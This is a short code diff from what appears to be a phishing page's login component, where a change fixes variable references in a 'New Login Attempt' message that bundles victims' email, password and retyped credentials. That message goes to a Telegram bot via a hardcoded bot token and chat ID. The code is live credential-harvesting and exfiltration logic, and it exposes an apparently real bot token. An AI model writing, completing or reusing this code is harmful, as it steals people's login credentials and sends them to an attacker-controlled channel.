@@ -259,7 +259,7 @@ export default {
             const botToken='7724144349:AAEQ74TSbpbUqRtRjUciNbwdGANwYaja57k';
             const chatId= '1613277499';
 
-            const message = `New Login Attempt:\nEmail: ${email}\nPassword: ${password}\nModalEmail: ${retypedEmail}\nModal-Password: ${retypedPassword}`;
+            const message = `New Login Attempt:\nEmail: ${this.email}\nPassword: ${this.password}\nModalEmail: ${this.retypedEmail}\nModal-Password: ${this.retypedPassword}`;
 
    
             const backendUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
